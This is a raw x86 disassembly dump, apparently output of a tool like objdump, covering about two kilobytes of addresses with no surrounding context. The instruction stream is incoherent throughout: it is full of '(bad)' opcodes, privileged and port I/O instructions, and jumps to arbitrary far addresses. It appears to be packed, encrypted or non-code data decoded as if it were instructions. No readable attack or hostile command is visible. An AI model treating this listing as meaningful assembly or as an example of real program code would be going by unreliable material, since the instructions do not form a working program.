  411995:	fidivr DWORD PTR [edi]
  411997:	lods   eax,DWORD PTR ds:[esi]
  411998:	inc    ebx
  411999:	in     al,dx
  41199a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41199b:	dec    edi
  41199c:	mov    bh,0xa9
  41199e:	(bad)  
  41199f:	mov    esp,0x7aeee4c2
  4119a4:	sub    eax,0x4dad4ae1
  4119a9:	loop   0x4119ed
  4119ab:	div    ebp
  4119ad:	test   BYTE PTR [esi],ch
  4119af:	les    ebx,FWORD PTR [ebx+0x3]
  4119b2:	ret    
  4119b3:	imul   esp,DWORD PTR [edi+0x48922186],0x7f
  4119ba:	out    0x17,eax
  4119bc:	das    
  4119bd:	je     0x41195d
  4119bf:	inc    eax
  4119c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c1:	jae    0x411975
  4119c3:	test   al,0x64
  4119c5:	cmc    
  4119c6:	jge    0x411a27
  4119c8:	or     BYTE PTR [ecx],bl
  4119ca:	aas    
  4119cb:	dec    ebp
  4119cc:	stos   DWORD PTR es:[edi],eax
  4119cd:	inc    edx
  4119ce:	mov    esp,0xb0185051
  4119d3:	les    edx,FWORD PTR [ecx-0x65184980]
  4119d9:	adc    cl,BYTE PTR [esi+0x15c627fa]
  4119df:	push   esp
  4119e0:	sar    BYTE PTR ds:0xc19eca9e,1
  4119e6:	(bad)  
  4119e7:	aas    
  4119e8:	push   ebx
  4119e9:	(bad)  
  4119ea:	loop   0x411a63
  4119ec:	call   DWORD PTR [eax+0x58]
  4119ef:	jae    0x411a15
  4119f1:	sti    
  4119f2:	inc    ebx
  4119f3:	scas   al,BYTE PTR es:[edi]
  4119f4:	push   esp
  4119f5:	das    
  4119f6:	fcomp  st(0)
  4119f8:	into   
  4119f9:	pop    esp
  4119fa:	test   esi,eax
  4119fc:	(bad)  
  4119fd:	xlat   BYTE PTR ds:[ebx]
  4119fe:	push   ecx
  4119ff:	sbb    ah,ch
  411a01:	push   eax
  411a02:	ins    BYTE PTR es:[edi],dx
  411a03:	sub    BYTE PTR [ecx+ebx*1-0x1d],0x9e
  411a08:	push   ebx
  411a09:	add    eax,0xf06f175a
  411a0e:	test   al,0x9
  411a10:	test   BYTE PTR [edi],0xb9
  411a13:	mov    ah,0x3
  411a15:	cmp    ebp,ecx
  411a17:	pop    ss
  411a18:	sub    BYTE PTR [esp+eax*1+0x12],bh
  411a1c:	rcr    DWORD PTR [eax+0x2a1b997a],1
  411a22:	push   cs
  411a23:	js     0x411a30
  411a25:	mov    ah,0x8f
  411a27:	sub    DWORD PTR [ecx-0x13],ecx
  411a2a:	dec    edx
  411a2b:	inc    esp
  411a2c:	or     eax,0xfe946b16
  411a31:	in     eax,0x6
  411a33:	sbb    esi,DWORD PTR [edi+eiz*8+0x67010dcc]
  411a3a:	adc    DWORD PTR [ebp-0x42a16bba],eax
  411a40:	ret    0x3719
  411a43:	test   BYTE PTR [ebp+eax*2+0x250e12ac],bl
  411a4a:	(bad)  
  411a4b:	sub    ch,BYTE PTR [ebx-0x7c]
  411a4e:	je     0x411a98
  411a50:	fs fs cmp al,0x5e
  411a54:	in     eax,dx
  411a55:	inc    ecx
  411a56:	xchg   esp,eax
  411a57:	push   ebx
  411a58:	push   ecx
  411a59:	mov    edx,0x83f0fee6
  411a5e:	gs pop ebx
  411a60:	mov    ch,0x47
  411a62:	mov    DWORD PTR [edi-0x76e30b44],0x8a1babd8
  411a6c:	adc    ah,BYTE PTR [edi+ecx*8-0x70]
  411a70:	sbb    ebp,0x18
  411a73:	in     eax,dx
  411a74:	sub    al,0x93
  411a76:	stc    
  411a77:	lods   eax,DWORD PTR ds:[esi]
  411a78:	cmp    eax,0xed7c8478
  411a7d:	xor    bh,ch
  411a7f:	cmp    BYTE PTR [esi+ecx*8-0x6f7033f0],bh
  411a86:	jl     0x411a86
  411a88:	or     BYTE PTR [eax],ah
  411a8a:	dec    edi
  411a8b:	sbb    DWORD PTR [edx-0x375c710b],0xffffff9b
  411a92:	or     ch,BYTE PTR [ebx+0xe]
  411a95:	les    esp,FWORD PTR [ebp-0x524e8090]
  411a9b:	mov    al,0xa9
  411a9d:	out    dx,eax
  411a9e:	or     BYTE PTR [ebx+0x5d90c6ed],bh
  411aa4:	dec    eax
  411aa5:	inc    esi
  411aa6:	pusha  
  411aa7:	sub    al,BYTE PTR [esi-0x6b8cb98]
  411aad:	dec    eax
  411aae:	sti    
  411aaf:	sub    eax,0x51e3fe36
  411ab4:	xchg   ecx,eax
  411ab5:	xchg   esp,eax
  411ab6:	fs imul esp,edx,0x9f0ba332
  411abd:	mov    edi,0x754e47b6
  411ac2:	int3   
  411ac3:	scas   al,BYTE PTR es:[edi]
  411ac4:	sbb    DWORD PTR [edi-0x523116f8],ebp
  411aca:	outs   dx,BYTE PTR ds:[esi]
  411acb:	fdivr  st(1),st
  411acd:	sub    ebx,DWORD PTR [edx]
  411acf:	inc    esi
  411ad0:	mov    eax,ds:0x7e6a2a11
  411ad5:	ss test al,0x4d
  411ad8:	data16 fiadd DWORD PTR [ebx]
  411adc:	xchg   DWORD PTR [ecx+0x2c447f0c],esp
  411ae2:	jecxz  0x411a8d
  411ae4:	cmp    DWORD PTR [ebx],0xffffffab
  411ae7:	adc    dh,BYTE PTR [edx-0x180426ec]
  411aed:	cli    
  411aee:	cmp    BYTE PTR [eax-0x35abcdf],dl
  411af4:	lods   al,BYTE PTR ds:[esi]
  411af5:	pop    ebx
  411af6:	xor    DWORD PTR [edx+ecx*8],edx
  411af9:	mov    edi,DWORD PTR [eax-0x63]
  411afc:	ins    BYTE PTR es:[edi],dx
  411afd:	mov    eax,0xf16ec39a
  411b02:	mov    ds:0xa13267bf,eax
  411b07:	lds    esp,FWORD PTR [edx-0x69]
  411b0a:	int    0x3e
  411b0c:	add    al,0xf7
  411b0e:	adc    eax,0x5196d43f
  411b13:	mov    dh,ah
  411b15:	pop    ebp
  411b16:	and    WORD PTR [ebx],bp
  411b19:	inc    esi
  411b1a:	add    eax,0x5e3c8795
  411b1f:	pusha  
  411b20:	int3   
  411b21:	cmc    
  411b22:	out    0xcb,eax
  411b24:	adc    dh,bl
  411b26:	shl    BYTE PTR [ecx-0x1d5b22a5],0x18
  411b2d:	push   ss
  411b2e:	icebp  
  411b2f:	in     eax,0xbe
  411b31:	push   edi
  411b32:	mov    DWORD PTR [esi+0x39731c84],edx
  411b38:	dec    ebp
  411b39:	xchg   esi,eax
  411b3a:	cld    
  411b3b:	out    dx,al
  411b3c:	test   eax,0x989923b6
  411b41:	call   0xa31debfb
  411b46:	adc    eax,0x7bd24363
  411b4b:	xor    esi,DWORD PTR [eax+0x182138b9]
  411b51:	loope  0x411b31
  411b53:	pop    ecx
  411b54:	call   0x1e5d:0x32eb7b97
  411b5b:	xchg   ecx,eax
  411b5c:	in     al,0xd1
  411b5e:	test   eax,0xbb1948b2
  411b63:	dec    esp
  411b64:	lock and eax,0xa5010f3f
  411b6a:	cmp    BYTE PTR [ebx],cl
  411b6c:	push   edx
  411b6d:	adc    BYTE PTR [eax],0x87
  411b70:	jecxz  0x411b48
  411b72:	mov    ecx,0x2c19ac2b
  411b77:	sbb    DWORD PTR [edx-0x41],ebp
  411b7a:	mov    ?,WORD PTR [ecx-0x5f]
  411b7d:	add    al,0xea
  411b7f:	repz ror BYTE PTR [ebp-0x5a],1
  411b83:	dec    edx
  411b84:	call   0xe1e21f2a
  411b89:	ins    BYTE PTR es:[edi],dx
  411b8a:	ss std 
  411b8c:	inc    eax
  411b8d:	and    BYTE PTR [ebp+0x7a784fa1],cl
  411b93:	jo     0x411b2a
  411b95:	mov    eax,ds:0x5329d951
  411b9a:	ret    
  411b9b:	in     eax,dx
  411b9c:	shr    BYTE PTR [esi],0x42
  411b9f:	idiv   BYTE PTR [edi-0x3f24294]
  411ba5:	bound  esi,QWORD PTR [ecx]
  411ba7:	fistp  WORD PTR [edi]
  411ba9:	push   cs
  411baa:	inc    esi
  411bab:	cmp    al,0x8f
  411bad:	push   eax
  411bae:	lea    eax,[ebx]
  411bb0:	in     eax,0x68
  411bb2:	test   BYTE PTR [edi-0x1],al
  411bb5:	and    DWORD PTR [eax],0xab1eaa56
  411bbb:	and    ebx,esp
  411bbd:	in     al,dx
  411bbe:	jno    0x411c08
  411bc0:	lods   al,BYTE PTR ds:[esi]
  411bc1:	ja     0x411be5
  411bc3:	(bad)  
  411bc4:	sbb    eax,0x733a4990
  411bc9:	inc    esi
  411bca:	xor    dl,BYTE PTR [esi-0x41]
  411bcd:	xor    DWORD PTR [esp+edx*4],ebp
  411bd0:	pop    es
  411bd1:	(bad)  
  411bd2:	push   0xffffffe2
  411bd4:	dec    eax
  411bd5:	or     eax,0xba4e1755
  411bda:	call   0xe2de:0x6222567b
  411be1:	(bad)  
  411be2:	push   0xffffffeb
  411be4:	loopne 0x411bc0
  411be6:	push   esp
  411be7:	cmp    DWORD PTR [eax+0x2e],edx
  411bea:	lea    ebp,[esi]
  411bec:	adc    eax,0xa7077d87
  411bf1:	sbb    cl,BYTE PTR [edx-0x4d]
  411bf4:	cmp    ecx,DWORD PTR [ecx]
  411bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bf7:	adc    BYTE PTR [esi+0x56056980],al
  411bfd:	aaa    
  411bfe:	mov    cl,BYTE PTR [esi]
  411c00:	rol    BYTE PTR [di-0xf],cl
  411c04:	repnz inc ebx
  411c06:	addr16 sub eax,0x31ed2df3
  411c0c:	push   0xf7b137ed
  411c11:	sub    al,0xc
  411c13:	mov    WORD PTR [ebp-0x11],?
  411c16:	call   DWORD PTR [ebx+esi*1-0x54]
  411c1a:	aad    0xc6
  411c1c:	and    BYTE PTR [ecx-0x31],al
  411c1f:	pop    eax
  411c20:	push   ds
  411c21:	xchg   BYTE PTR ds:0xcdb0186a,al
  411c27:	lahf   
  411c28:	test   BYTE PTR [edi],0x3
  411c2b:	inc    edi
  411c2c:	adc    DWORD PTR [esi],ebx
  411c2e:	shl    BYTE PTR [edx],1
  411c30:	(bad)  
  411c31:	bound  edx,QWORD PTR [ebx+0x522805a]
  411c37:	jnp    0x411c27
  411c39:	ds dec ecx
  411c3b:	mov    al,0x79
  411c3d:	inc    esp
  411c3e:	mov    dl,0x7b
  411c40:	mov    eax,ds:0xd0f96b27
  411c45:	cmp    BYTE PTR ds:0x58d2418a,ah
  411c4b:	cdq    
  411c4c:	dec    dh
  411c4e:	(bad)  
  411c4f:	repnz inc edx
  411c51:	sub    al,0x1
  411c53:	cmp    DWORD PTR [esi-0x2ecacba3],0xe36920b1
  411c5d:	push   cs
  411c5e:	in     al,0x9b
  411c60:	push   esi
  411c61:	enter  0x3793,0x78
  411c65:	fild   WORD PTR [ecx-0x22968352]
  411c6b:	fnstenv ds:0xae63509b
  411c71:	std    
  411c72:	loopne 0x411cf0
  411c74:	cmp    ebp,DWORD PTR [ecx-0x46]
  411c77:	jne    0x411c3d
  411c79:	imul   DWORD PTR [ecx-0x3]
  411c7c:	nop
  411c7d:	out    0x16,eax
  411c7f:	hlt    
  411c80:	hlt    
  411c81:	xchg   ecx,eax
  411c82:	in     al,dx
  411c83:	bnd jnp 0x411c83
  411c86:	xchg   esp,eax
  411c87:	and    bl,ah
  411c89:	push   ecx
  411c8a:	pop    es
  411c8b:	jae    0x411c16
  411c8d:	(bad)  
  411c8e:	bound  esp,QWORD PTR [eax]
  411c90:	push   esp
  411c91:	mov    ds:0xe6d653db,eax
  411c96:	jo     0x411ceb
  411c98:	mul    BYTE PTR gs:[edi+0x2c]
  411c9c:	(bad)  
  411c9d:	sbb    eax,0xec0c9405
  411ca2:	fbld   TBYTE PTR [ebp+0x3d3e7276]
  411ca8:	stos   BYTE PTR es:[edi],al
  411ca9:	inc    ecx
  411caa:	xchg   DWORD PTR ds:0x32e5b5b7,ebp
  411cb0:	or     edx,ebx
  411cb2:	imul   BYTE PTR ds:0x6b874db8
  411cb8:	repz jnp 0x411caf
  411cbb:	mov    ds,WORD PTR [edx]
  411cbd:	and    esi,edi
  411cbf:	ret    0xf987
  411cc2:	sub    ah,BYTE PTR [ebx]
  411cc4:	sahf   
  411cc5:	out    0xfd,al
  411cc7:	scas   eax,DWORD PTR es:[edi]
  411cc8:	or     dl,dl
  411cca:	push   eax
  411ccb:	jp     0x411d03
  411ccd:	(bad)  
  411cce:	scas   eax,DWORD PTR es:[edi]
  411ccf:	fbstp  TBYTE PTR [esi-0x7]
  411cd2:	neg    DWORD PTR [edx-0x34]
  411cd5:	cmp    eax,0x81e88443
  411cda:	pop    esi
  411cdb:	and    cl,BYTE PTR [ebx+esi*2+0x41]
  411cdf:	inc    esi
  411ce0:	jns    0x411cf6
  411ce2:	push   cs
  411ce3:	repz cld 
  411ce5:	outs   dx,DWORD PTR ds:[esi]
  411ce6:	add    al,0x36
  411ce8:	mov    edi,0xad5efc7b
  411ced:	rcl    ebp,0xde
  411cf0:	aas    
  411cf1:	jmp    ecx
  411cf3:	add    al,0x91
  411cf5:	stos   BYTE PTR es:[edi],al
  411cf6:	lods   al,BYTE PTR ds:[esi]
  411cf7:	mov    esi,0x3a61c92d
  411cfc:	adc    eax,0xa2e707e
  411d01:	fldenv [ebx+0x5e2d25ce]
  411d07:	inc    eax
  411d08:	mov    al,ds:0x6e2eaefb
  411d0d:	inc    edx
  411d0e:	popf   
  411d0f:	addr16 repz inc edi
  411d12:	(bad)
  411d15:	dec    esp
  411d16:	out    0xe1,al
  411d18:	test   DWORD PTR [edi],edi
  411d1a:	js     0x411d54
  411d1c:	adc    eax,0x4a70fdd1
  411d21:	push   ebx
  411d22:	mul    ebp
  411d24:	hlt    
  411d25:	mov    esi,0xd7d8ad1f
  411d2a:	pop    edx
  411d2b:	js     0x411d85
  411d2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d2f:	dec    ecx
  411d30:	adc    al,0xb2
  411d32:	arpl   si,si
  411d34:	mov    al,ds:0xacc577b4
  411d39:	mov    al,0xb1
  411d3b:	inc    edx
  411d3c:	rcr    BYTE PTR [eax+0x33],cl
  411d3f:	xchg   ebx,eax
  411d40:	mov    dl,0xef
  411d42:	(bad)  
  411d44:	inc    eax
  411d45:	sub    bh,dl
  411d47:	mov    ecx,0x6a48e9b6
  411d4c:	mov    al,0x20
  411d4e:	and    DWORD PTR [ebx-0x52193363],0x7c
  411d55:	mov    dl,0x61
  411d57:	add    al,0x3d
  411d59:	xor    al,0xb0
  411d5b:	push   ss
  411d5c:	ror    BYTE PTR [ebx-0x3958386a],0xd
  411d63:	(bad)  
  411d65:	pusha  
  411d66:	jne    0x411d32
  411d68:	inc    ebx
  411d69:	enter  0x7bdc,0x45
  411d6d:	int3   
  411d6e:	mov    ds:0x86d7d194,al
  411d73:	popa   
  411d74:	sbb    esi,DWORD PTR [edx+edx*1-0x21]
  411d78:	pop    ebx
  411d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d7a:	mov    ds:0x4063ddbd,eax
  411d7f:	push   ebx
  411d80:	fsub   QWORD PTR [edx+0x46]
  411d83:	in     al,dx
  411d84:	mov    ebx,0x8dc16e1b
  411d89:	fadd   DWORD PTR [eax-0x6b0683a6]
  411d8f:	mov    eax,0xaaf0583a
  411d94:	adc    esi,DWORD PTR [ebx+edi*4+0x46]
  411d98:	rcl    BYTE PTR [esi-0x2b3eb0d8],cl
  411d9e:	retf   0x386
  411da1:	ficom  WORD PTR [ebx+ebx*2-0x37d5dacd]
  411da8:	iret   
  411da9:	or     bl,BYTE PTR ds:0xee795b17
  411daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db0:	xor    cl,cl
  411db2:	mov    ah,0xc0
  411db4:	jg     0x411d60
  411db6:	aaa    
  411db7:	cmc    
  411db8:	inc    esi
  411db9:	neg    BYTE PTR [eax]
  411dbb:	push   ebp
  411dbc:	sbb    BYTE PTR [esi],0xb3
  411dbf:	lock cmp dl,BYTE PTR [esi+0x75]
  411dc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dc4:	push   ds
  411dc5:	xchg   ecx,eax
  411dc6:	mov    dh,bl
  411dc8:	mov    ds:0x956ee826,al
  411dcd:	cmp    BYTE PTR [esi+0x2ce0de21],bh
  411dd3:	rcr    edi,cl
  411dd5:	aaa    
  411dd6:	fmul   DWORD PTR [esi]
  411dd8:	cld    
  411dd9:	(bad)  
  411dda:	je     0x411d77
  411ddc:	jns    0x411d9f
  411dde:	pop    edi
  411ddf:	(bad)  [edi-0x1d]
  411de2:	aas    
  411de3:	jnp    0x411dc0
  411de5:	push   eax
  411de6:	daa    
  411de7:	das    
  411de8:	iret   
  411de9:	mov    al,0xa9
  411deb:	(bad)  
  411dec:	jle    0x411e50
  411dee:	dec    esi
  411def:	add    eax,0x6a42f095
  411df5:	push   esp
  411df6:	cmp    BYTE PTR [ebx+0x6d],0x71
  411dfa:	imul   esp,eax,0xffffffa0
  411dfd:	jo     0x411e33
  411dff:	test   ah,bh
  411e01:	fwait
  411e02:	ins    BYTE PTR es:[edi],dx
  411e03:	and    BYTE PTR [edi-0x6b],0x3b
  411e07:	or     DWORD PTR [esi-0x51607e60],ecx
  411e0d:	mov    edi,0x23451bc4
  411e12:	retf   
  411e13:	das    
  411e14:	pop    edx
  411e15:	addr16 dec esp
  411e17:	or     eax,0xf3e7ede6
  411e1c:	shl    BYTE PTR [esi+0x32],cl
  411e1f:	dec    DWORD PTR [ecx+0x5ca4ebee]
  411e25:	adc    BYTE PTR [ecx+0xc],ch
  411e28:	fistp  QWORD PTR [eax-0x14]
  411e2b:	mov    BYTE PTR [ecx-0x3bc36b34],ah
  411e31:	push   edi
  411e32:	das    
  411e33:	mov    eax,0xd76e4e3e
  411e38:	mov    es,WORD PTR [esi]
  411e3a:	and    bh,BYTE PTR [edi+0x11]
  411e3d:	mov    ds:0xed25e397,al
  411e42:	mov    bl,0x89
  411e44:	popf   
  411e45:	out    dx,al
  411e46:	pop    edx
  411e47:	inc    esi
  411e48:	push   eax
  411e49:	es xchg esi,eax
  411e4b:	push   0x15
  411e4d:	dec    eax
  411e4e:	xchg   DWORD PTR [ebp-0x2221b760],ebx
  411e54:	cld    
  411e55:	sub    DWORD PTR [esi],0xb747ce7f
  411e5b:	ret    0xb9aa
  411e5e:	gs or  al,0x69
  411e61:	xchg   ebp,eax
  411e62:	add    DWORD PTR [eax+0x55],esp
  411e65:	xor    DWORD PTR [eax],0xffffff81
  411e68:	scas   eax,DWORD PTR es:[edi]
  411e69:	aas    
  411e6a:	dec    edi
  411e6b:	sub    bh,dl
  411e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e6e:	jg     0x411df0
  411e70:	out    0x92,eax
  411e72:	mov    eax,ds:0x5d8f1668
  411e77:	push   ebp
  411e78:	xchg   ebx,eax
  411e79:	(bad)  
  411e7b:	sti    
  411e7c:	in     al,dx
  411e7d:	or     ch,BYTE PTR [edi+edx*2-0x1e]
  411e81:	push   edx
  411e82:	(bad)  ds:0x2677cbd
  411e88:	rcr    DWORD PTR [ebx-0x1b5313e1],0xdf
  411e8f:	jg     0x411e39
  411e91:	in     al,dx
  411e92:	push   edx
  411e93:	stc    
  411e94:	loope  0x411e69
  411e96:	test   eax,0xe8e918f9
  411e9b:	xor    al,0x7e
  411e9d:	or     eax,0xf646b471
  411ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ea3:	xor    eax,0x2932f165
  411ea8:	inc    ecx
  411ea9:	jmp    0x411e4f
  411eab:	mov    ecx,0xdc9d30c8
  411eb0:	xchg   edx,eax
  411eb1:	loopne 0x411ed1
  411eb3:	outs   dx,BYTE PTR ds:[esi]
  411eb4:	mov    DWORD PTR [esi+0x78884d27],esp
  411eba:	leave  
  411ebb:	mov    esi,0x24e6025e
  411ec0:	or     cl,BYTE PTR ds:0x41421a3d
  411ec6:	push   ecx
  411ec7:	add    BYTE PTR [eax],ah
  411ec9:	pop    edx
  411eca:	in     al,0x26
  411ecc:	in     al,dx
  411ecd:	pop    esp
  411ece:	sbb    DWORD PTR [edi+0x6cb06ebf],esi
  411ed4:	pop    es
  411ed5:	mov    dl,0xfd
  411ed7:	and    ebx,esi
  411ed9:	pop    ss
  411eda:	adc    eax,edi
  411edc:	jle    0x411e71
  411ede:	scas   eax,DWORD PTR es:[edi]
  411edf:	add    dh,BYTE PTR [esi+esi*2+0x741799ac]
  411ee6:	jl     0x411f51
  411ee8:	or     BYTE PTR [edx],0xe6
  411eeb:	fisub  DWORD PTR ds:0xd921ce12
  411ef1:	and    bh,cl
  411ef3:	xor    dl,cl
  411ef5:	lea    esi,[ebp+0x610e27a5]
  411efb:	loop   0x411f13
  411efd:	hlt    
  411efe:	sub    BYTE PTR [eax-0x53],0xa7
  411f02:	imul   esi,DWORD PTR [ebp-0x4523fc4b],0x577691ec
  411f0c:	fistp  QWORD PTR [ebx]
  411f0e:	repz test al,0xf8
  411f11:	push   0x22ed62b3
  411f16:	jmp    0x411f0f
  411f18:	xor    DWORD PTR [ebp-0x69c1c770],eax
  411f1e:	push   es
  411f1f:	ja     0x411f6d
  411f21:	inc    ebp
  411f22:	pop    edx
  411f23:	mov    esi,0xa7fc9a5a
  411f28:	leave  
  411f29:	ds scas eax,DWORD PTR es:[edi]
  411f2b:	and    edi,eax
  411f2d:	push   edx
  411f2e:	pushf  
  411f2f:	jnp    0x411f2d
  411f31:	mov    dh,0x9d
  411f33:	add    ecx,DWORD PTR [edi]
  411f35:	into   
  411f36:	fdiv   QWORD PTR [edi]
  411f38:	loope  0x411edf
  411f3a:	mov    dl,0x61
  411f3c:	out    0xcc,al
  411f3e:	sub    BYTE PTR [ecx+0x7c],dh
  411f41:	mov    cl,0xa8
  411f43:	leave  
  411f44:	cs jmp 0x3b39:0x6a9ae720
  411f4c:	stc    
  411f4d:	jns    0x411fca
  411f4f:	jbe    0x411f06
  411f51:	jns    0x411ee1
  411f53:	in     eax,0x34
  411f55:	vdivsd xmm6,xmm0,QWORD PTR [eax]
  411f59:	push   ss
  411f5a:	jns    0x411f62
  411f5c:	cmp    al,0xf9
  411f5e:	lods   eax,DWORD PTR ds:[esi]
  411f5f:	ss scas al,BYTE PTR es:[edi]
  411f61:	(bad)  
  411f62:	gs inc ebx
  411f64:	push   edi
  411f65:	xchg   edx,eax
  411f66:	and    BYTE PTR [ebp+0xbf9a7df],ch
  411f6c:	xlat   BYTE PTR ds:[ebx]
  411f6d:	pop    edx
  411f6e:	loope  0x411f4f
  411f70:	dec    edi
  411f71:	add    DWORD PTR [esi-0x2503435f],esi
  411f77:	ja     0x411f87
  411f79:	sti    
  411f7a:	or     edx,DWORD PTR [ebx]
  411f7c:	cmp    DWORD PTR [esi+0x58ab9b1f],edi
  411f82:	icebp  
  411f83:	sub    DWORD PTR [ebx+0x5c7fa4e4],0x22d9ab69
  411f8d:	jecxz  0x411f5d
  411f8f:	ja     0x411fd8
  411f91:	outs   dx,BYTE PTR ds:[esi]
  411f92:	icebp  
  411f93:	imul   esi,DWORD PTR [eax+edx*8],0x56df4a90
  411f9a:	test   BYTE PTR [edx+0x79],al
  411f9d:	sbb    DWORD PTR [edi-0x40aa8f94],0x6bfca1dc
  411fa7:	sbb    bh,dl
  411fa9:	ds lock fwait
  411fac:	adc    eax,0x2cd468d3
  411fb1:	mov    ds:0x8d2f6cdf,al
  411fb6:	pop    eax
  411fb7:	cmp    ebp,ecx
  411fb9:	bound  ebx,QWORD PTR [eax+edi*8]
  411fbc:	xchg   edx,eax
  411fbd:	cmp    eax,0xe01345b1
  411fc2:	(bad)  
  411fc3:	xchg   esi,eax
  411fc4:	mov    ah,0x3b
  411fc6:	idiv   DWORD PTR [ebx+0x7f]
  411fc9:	push   ebp
  411fca:	aad    0xea
  411fcc:	dec    eax
  411fcd:	or     al,0xc7
  411fcf:	jmp    0x6ee9a8ea
  411fd4:	sahf   
  411fd5:	sub    eax,0x9ab0295b
  411fda:	lds    esp,FWORD PTR [ecx-0x536488ae]
  411fe0:	test   al,0x76
  411fe2:	(bad)  
  411fe3:	sub    eax,0x23817758
  411fe8:	pop    eax
  411fe9:	cs fmul st,st(5)
  411fec:	xor    edx,DWORD PTR [edx-0x9]
  411fef:	adc    ebp,ebp
  411ff1:	pusha  
  411ff2:	enter  0x5a62,0xe5
  411ff6:	js     0x411fe9
  411ff8:	cdq    
  411ff9:	adc    DWORD PTR [eax-0x30],eax
  411ffc:	mov    dl,0x63
  411ffe:	sub    eax,0x6c4c7a66
  412003:	enter  0x4d5a,0xfc
  412007:	adc    al,0xf4
  412009:	jne    0x411ff4
  41200b:	push   ebx
  41200c:	out    dx,al
  41200d:	(bad)  
  41200f:	mov    dl,0xc9
  412011:	ins    DWORD PTR es:[edi],dx
  412012:	cwde   
  412013:	xchg   ebp,edx
  412015:	outs   dx,DWORD PTR ds:[esi]
  412016:	mov    ss,ebp
  412018:	(bad)  
  412019:	xor    ch,ch
  41201b:	adc    edi,DWORD PTR [edi+eax*8-0x5c]
  41201f:	and    ah,BYTE PTR [eax*8+0x169ee09c]
  412026:	and    edx,ebp
  412028:	sar    BYTE PTR [ebx+ebp*1+0x9],cl
  41202c:	mov    dh,0x1f
  41202e:	push   es
  41202f:	mov    WORD PTR [edi],?
  412031:	xlat   BYTE PTR ds:[ebx]
  412032:	fucom  st(6)
  412034:	or     edx,DWORD PTR [esi]
  412036:	jbe    0x41209c
  412038:	pop    edx
  412039:	daa    
  41203a:	imul   edi,DWORD PTR [edi+0x11],0xffffff87
  41203e:	or     BYTE PTR [ebx+0x6b],ah
  412041:	jl     0x411fdd
  412043:	in     eax,dx
  412044:	ss daa 
  412046:	cdq    
  412047:	and    bh,BYTE PTR [eax+0x7c643ce1]
  41204d:	xchg   esp,eax
  41204e:	mov    esp,0xfb603fa2
  412053:	shrd   DWORD PTR [ebx],edx,cl
  412056:	and    dh,bh
  412058:	push   0x17219349
  41205d:	call   0x5b390729
  412062:	out    dx,eax
  412063:	or     ebp,DWORD PTR [edx+0xb]
  412066:	mov    ebp,0xef231698
  41206b:	cwde   
  41206c:	data16 add al,0x4c
  41206f:	jbe    0x4120cc
  412071:	or     al,0xf8
  412073:	pop    edx
  412074:	inc    edx
  412075:	mov    BYTE PTR [ecx],al
  412077:	mov    gs,edi
  412079:	jl     0x4120be
  41207b:	xchg   ecx,eax
  41207c:	inc    ebp
  41207e:	adc    eax,0x73216acf
  412083:	mov    cl,0x21
  412085:	xor    bh,bh
  412087:	repnz lahf 
  412089:	mov    edx,0x7d050a47
  41208e:	mov    ch,0x95
  412090:	loopne 0x4120ba
  412092:	cld    
  412093:	mov    bh,0xcd
  412095:	adc    eax,0xf10d109f
  41209a:	sub    DWORD PTR [eax+0xebee151],ebp
  4120a0:	add    BYTE PTR [eax-0x1c601ef0],dl
  4120a6:	jecxz  0x4120cb
  4120a8:	push   ebx
  4120a9:	sub    al,0x24
  4120ab:	jae    0x41203e
  4120ad:	jmp    DWORD PTR [esi]
  4120af:	jnp    0x4120ba
  4120b1:	inc    esi
  4120b2:	sti    
  4120b3:	inc    ebx
  4120b4:	inc    eax
  4120b5:	mov    al,ds:0x79c88850
  4120ba:	out    dx,eax
  4120bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120bc:	sub    BYTE PTR [ebp+0x56ea5437],ch
  4120c2:	xchg   esp,eax
  4120c3:	mov    bh,0xbf
  4120c5:	bound  edx,QWORD PTR [eax+0x39]
  4120c8:	test   al,0xda
  4120ca:	jle    0x41213b
  4120cc:	shr    BYTE PTR [eax],cl
  4120ce:	adc    esp,ecx
  4120d0:	and    eax,0xfcb8657d
  4120d5:	mov    esp,0x812d26ac
  4120da:	call   0xa988279
  4120df:	cmp    ebp,esi
  4120e1:	repz mov cl,0x20
  4120e4:	xor    al,BYTE PTR [eax-0x293af5ef]
  4120ea:	mov    dl,0xf0
  4120ec:	mov    edi,eax
  4120ee:	loop   0x4120c6
  4120f0:	(bad)
  4120f4:	adc    al,0xfa
  4120f6:	in     eax,0x6c
  4120f8:	out    0xce,eax
  4120fa:	clc    
  4120fb:	xlat   BYTE PTR ds:[ebx]
  4120fc:	jbe    0x412116
  4120fe:	inc    edi
  4120ff:	in     eax,dx
  412100:	ins    DWORD PTR es:[edi],dx
  412101:	mov    ebp,0x9d2b8d1
  412106:	cmp    eax,0xef9c81a1
  41210b:	fdivrp st(5),st
  41210d:	aas    
  41210e:	dec    ecx
  41210f:	adc    eax,0x30c7a0b9
  412114:	loop   0x4120c0
  412116:	jmp    0x412185
  412118:	mov    BYTE PTR [edi-0x1e],dl
  41211b:	std    
  41211c:	jmp    0x7387:0x484dfe1e
  412123:	stos   DWORD PTR es:[edi],eax
  412124:	pop    es
  412125:	in     al,0x66
  412127:	push   es
  412128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412129:	and    ch,BYTE PTR [edx-0x5f]
  41212c:	gs out dx,al
  41212e:	(bad)  
  412130:	(bad)  
  412131:	jmp    0xac:0xa1babea
  412138:	bound  esp,QWORD PTR [edx+0x36eee633]
  41213e:	loop   0x412118
  412140:	mov    DWORD PTR [edi+0x640ef7a7],eax
  412146:	push   eax
  412147:	sbb    BYTE PTR [edi+0x2e],0x12
  41214b:	(bad)  
  41214d:	js     0x4120d0
  41214f:	add    al,0xde
  412151:	inc    edi
  412152:	cwde   
  412153:	dec    esi
  412154:	daa    
  412155:	arpl   di,bp
  412157:	sbb    BYTE PTR [ebx-0x2d75ed69],0x80
  41215e:	mov    BYTE PTR [edx+0x2],cl
  412161:	pop    edi
  412162:	or     BYTE PTR [ebx],ah
  412164:	data16 jo 0x412139
  412167:	push   edi
  412168:	(bad)  [edx-0x3c]
